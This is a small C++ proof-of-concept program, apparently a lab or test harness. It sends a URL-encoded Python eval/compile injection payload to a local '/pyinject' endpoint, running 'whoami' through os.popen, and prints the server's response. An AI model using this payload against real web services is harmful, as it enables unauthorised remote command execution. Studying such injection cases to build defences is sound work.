#include <cpr/cpr.h>
#include <iostream>

int main() {
    cpr::Header headers = { {"User-Agent", "curl/7.81.0"} };

    auto response = cpr::Get(cpr::Url{ "http://127.0.0.1:8080/pyinject?param1=eval(compile(%22%22%22for%20x%20in%20range(1):\\n%20import%20os\\n%20os.popen(r%27whoami%27).read()%22%22%22,%27%27,%27single%27))" },
        headers);

    std::cout << "Response code: " << response.status_code << std::endl;
    std::cout << "Response body: " << response.text << std::endl;

    return static_cast<int>(response.status_code);
}
